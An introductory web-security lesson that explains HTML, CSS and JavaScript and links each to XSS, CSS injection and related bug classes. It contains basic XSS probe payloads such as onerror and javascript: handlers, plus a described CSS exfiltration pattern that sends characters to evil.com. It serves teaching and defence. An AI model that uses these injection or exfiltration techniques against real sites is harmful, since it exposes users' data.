# HTML, CSS & JavaScript

The three languages every browser speaks. You don't need to become a front-end developer, but you must recognise what each does — because each is home to its own class of security bugs.

## The three-way split

- **HTML** — the **structure**. Headings, paragraphs, links, forms. The "bones" of the page.
- **CSS** — the **style**. Colours, fonts, spacing, animation. The "skin."
- **JavaScript** — the **behaviour**. Reacting to clicks, changing content, making requests. The "muscle."

Every web page is a mixture of these three, and each brings its own vulnerabilities.

## HTML in 60 seconds

HTML uses **tags** in angle brackets to describe structure:

```html
<!doctype html>
<html>
<head>
  <title>Hello</title>
</head>
<body>
  <h1>Welcome</h1>
  <p>This is a <a href="/next">link</a>.</p>
  <img src="/logo.png" alt="Logo">
  <form action="/login" method="POST">
    <input type="text"     name="username">
    <input type="password" name="password">
    <button type="submit">Log in</button>
  </form>
</body>
</html>
```

Tags come in pairs (`<p>...</p>`) or are self-closing (`<img />`). Attributes carry properties (`href`, `src`, `name`). The whole document forms a tree called the **DOM** (Document Object Model), which JavaScript can read and modify.

Tags you'll meet constantly:

| Tag | Purpose |
|---|---|
| `<a>` | Link |
| `<img>` | Image |
| `<form>`, `<input>`, `<button>` | User input |
| `<div>`, `<span>` | Generic containers |
| `<script>` | JavaScript |
| `<iframe>` | Embed another page |

## CSS in 60 seconds

CSS says how HTML should look:

```css
/* Every h1 is amber and bold */
h1 {
  color: #EFA43A;
  font-weight: 700;
}

/* Elements with class="btn" get styled */
.btn {
  padding: 10px 20px;
  background: teal;
  color: white;
  border-radius: 6px;
}

/* Element with id="hero" */
#hero {
  text-align: center;
}
```

You select elements by tag name (`h1`), class (`.btn`), or id (`#hero`), and give them properties.

CSS is mostly a defence-side concern in security, but it has its own attack angles: **CSS injection** can steal data character-by-character, and CSS can be used in some **clickjacking** and **UI-redress** attacks.

## JavaScript in 60 seconds

JavaScript makes pages interactive. It runs *in your browser* on any page you visit — which is exactly why it's so dangerous when attacker-controlled.

```html
<button id="hello">Say hi</button>
<script>
  const btn = document.getElementById("hello");
  btn.addEventListener("click", () => {
    alert("Hello from JavaScript!");
  });
</script>
```

Modern JS can:

- Read and change any part of the DOM.
- Read and set **cookies** (unless `HttpOnly` is set).
- Make network requests to any URL (subject to CORS rules).
- Store data locally (`localStorage`, `sessionStorage`).
- Manipulate URLs, animate, run video, encrypt, etc.

**Every one of those powers is a potential attack vector** if attacker-controlled JavaScript ends up running on your page.

## Inline JavaScript — the many places code can hide

The `<script>` tag isn't the only place JavaScript lives. HTML has a long list of **event handler attributes** that also run JavaScript directly:

```html
<img src="x" onerror="alert(1)">
<body onload="alert(1)">
<a href="javascript:alert(1)">click me</a>
<svg onload="alert(1)">
```

This matters enormously for security: a filter that only strips `<script>` tags but forgets `onerror`, `onload`, or `javascript:` URLs is trivially bypassed. This is exactly why real-world XSS filter bypass lists (which you'll use directly in Path 11 and Path 15) are so long — there are dozens of HTML attributes and contexts that can execute code, not just one. Recognising *all* the places JavaScript can hide in HTML, not just the obvious `<script>` tag, is a genuinely important skill for both finding and defending against XSS.

## CSS selectors and specificity — a quick primer

Beyond the tag/class/id selectors above, CSS has combinators that target elements based on their relationship to others:

```css
/* Direct child */
nav > a { color: teal; }

/* Any descendant */
.sidebar a { font-size: 14px; }

/* Attribute selector — every input whose type is "password" */
input[type="password"] { border: 2px solid red; }
```

That last pattern — selecting by attribute — is what powers **CSS-based data exfiltration** attacks: a malicious stylesheet can use attribute selectors like `input[value^="a"]` combined with `background: url(https://evil.com/log?char=a)` to leak a form's value one character at a time, purely through CSS, with no JavaScript involved at all. It's a genuinely surprising attack for people who assume CSS is "just styling" and therefore safe.

## The security shape of each language

Here's the crucial map, worth pinning to memory:

| Language | Where it lives | Signature bug class |
|---|---|---|
| **HTML** | The DOM | **XSS** (Cross-Site Scripting) |
| **CSS** | Style rules | CSS injection, clickjacking |
| **JavaScript** | Browser JS engine | **XSS**, DOM clobbering, prototype pollution, supply-chain |
| **HTML forms** | User input | **CSRF**, form spoofing, hidden-field manipulation |

## Where user input becomes dangerous

Take this HTML template on a shopping site:

```html
<h1>Search results for: [USER INPUT]</h1>
```

If the site inserts the user's search term straight into the HTML without escaping, and the user searches for:

```html
<script>alert(1)</script>
```

...the browser will *execute* that script as if the site itself wrote it. That's **reflected XSS** — one of the classic web bugs, and it lives in the boundary between user input and HTML rendering.

Path 11 has an entire lesson on XSS. For now, remember the shape: **untrusted input → HTML context → executed as code**.

## JSON — the modern glue

Most modern web apps don't render entire HTML pages any more. Instead they load a JavaScript "app" once, then quietly fetch data as **JSON** as you use the site:

```json
{
  "user": "alice",
  "id": 1,
  "roles": ["admin", "editor"]
}
```

You'll see JSON everywhere in Path 11 (APIs) and Path 15 (bug bounty). If you can read JSON, you can read most modern APIs.

## Browser security foundations (glossary)

Terms you'll meet again and again:

- **Same-Origin Policy (SOP)** — by default, JavaScript from `siteA.com` can't read data from `siteB.com`. This is the browser's most important security rule.
- **CORS (Cross-Origin Resource Sharing)** — the mechanism that lets sites *selectively* opt in to cross-origin sharing. Misconfigured CORS is a common bug class.
- **CSP (Content Security Policy)** — an HTTP header restricting *where* the page can load scripts, images, styles from. A strong XSS defence.
- **Cookies** — small values the browser stores per site (next lesson).
- **HTTP-only, Secure, SameSite** — cookie flags that harden them.

## 🧪 Lab — Break into the DOM

1. Open any page (say, [example.com](https://example.com)) in Firefox in Kali.
2. Press **F12** → **Console**.
3. Type:

```javascript
document.title = "Hacked (locally)";
document.body.style.background = "#EFA43A";
document.querySelectorAll("a").forEach(a => a.textContent = "🐉");
```

Press Enter after each line. Watch the page change *right now*, in your own browser.

This is the exact power an XSS attacker gets on *someone else's* browser. Path 11 covers how attackers *land* code on a page — this lab is only what the code can do *once* there.

:::challenge Test yourself
Which browser security rule stops JavaScript on `evil.com` from reading data on `bank.com` by default?

<details><summary>Show answer</summary>The <strong>Same-Origin Policy (SOP)</strong>.</details>
:::

## Key terms

- **HTML / CSS / JS** — structure / style / behaviour.
- **DOM** — the tree representation of an HTML document.
- **XSS** — untrusted input executed as code in the page.
- **JSON** — the modern data format between browser and server.
- **SOP / CORS / CSP** — the browser's core security mechanisms.

## Recap

- HTML structures pages, CSS styles them, JavaScript adds behaviour.
- Each language brings distinct bug classes; XSS lives at the HTML/JS boundary.
- Modern apps use JSON APIs behind a single-page front-end.
- SOP, CORS, and CSP are the browser's security backbone.

???refs
- [MDN Web Docs](https://developer.mozilla.org/) — the definitive reference for HTML, CSS, JS.
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Same-Origin Policy explained — MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [CSP Evaluator by Google](https://csp-evaluator.withgoogle.com/) — paste a site's CSP, get a security review.
???

**Next up →** [Client vs server](#/lesson/05-web-basics/client-vs-server)
